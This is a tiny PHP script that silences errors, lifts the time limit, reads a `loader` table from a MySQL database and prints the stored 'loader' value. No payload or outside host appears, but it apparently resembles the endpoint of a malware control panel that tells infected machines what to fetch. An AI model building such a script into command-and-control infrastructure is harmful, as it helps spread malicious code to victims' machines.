<?php
error_reporting(0);
set_time_limit(0);

require("mysql.php");
require("functions.php");

$request = "SELECT * FROM `loader`";
$answ = $base->query($request);
$row = $answ->fetchAll();
echo $row[0]['loader'];

?>